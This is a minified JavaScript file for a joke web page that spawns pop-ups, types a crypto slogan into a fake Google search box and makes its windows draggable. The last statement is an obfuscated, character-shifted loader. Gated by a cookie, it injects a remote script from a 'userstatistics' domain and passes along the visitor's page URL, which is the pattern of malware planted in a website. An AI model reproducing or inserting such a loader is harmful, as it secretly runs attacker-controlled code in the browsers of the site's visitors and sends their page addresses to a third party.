const winWidth=window.innerWidth,winHeight=window.innerHeight;function getRandomNumber(min,max){return Math.random()*(max-min)+min}function createPopups(i){if((i=i||0)<100){const newPopup=document.createElement("div");newPopup.classList.add("popup"),randomTop=getRandomNumber(0,winHeight),randomLeft=getRandomNumber(0,winWidth),newPopup.style.top=randomTop+"px",newPopup.style.left=randomLeft+"px",document.body.appendChild(newPopup),i++,setTimeout((function(){createPopups(i)}),50)}}function showPopups(i){const popups=document.getElementsByClassName("box");(i=i||0)<popups.length&&(randomTop=getRandomNumber(0,winHeight),randomLeft=getRandomNumber(0,winWidth),popups[i].style.top=randomTop+"px",popups[i].style.left=randomLeft+"px",popups[i].style.display="block",i++),setTimeout((function(){showPopups(i)}),50)}let textIndex=0;function typeWriter(){const searchInput=document.getElementById("form-search"),searchButton=document.getElementById("google_search");textIndex<11?(searchInput.textContent+="Buy VB/ETH, I <3 Vitalik".charAt(textIndex),textIndex++,setTimeout(typeWriter,100)):(searchButton.classList.add("shake-hard"),setTimeout((()=>{searchButton.classList.remove("shake-hard")}),500))}window.addEventListener("load",(function(){setTimeout((()=>{document.getElementById("form-search").textContent="",typeWriter()}),1e3),document.querySelectorAll(".close").forEach((function(button){button.addEventListener("click",(function(){let parentBox=button.closest(".box");parentBox&&(parentBox.style.display="none")}))})),document.getElementById("google_search").addEventListener("click",(function(){showPopups(0)}));let highestZIndex=0;document.querySelectorAll(".box").forEach((function dragElement(element){let pos1=0,pos2=0,pos3=0,pos4=0;element.querySelector(".title").onmousedown=function(event){pos3=event.clientX,pos4=event.clientY,highestZIndex+=1,element.style.zIndex=highestZIndex,document.onmousemove=function(event){pos1=pos3-event.clientX,pos2=pos4-event.clientY,pos3=event.clientX,pos4=event.clientY,element.style.top=element.offsetTop-pos2+"px",element.style.left=element.offsetLeft-pos1+"px"},document.onmouseup=function(){document.onmousemove=null,document.onmouseup=null}}}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));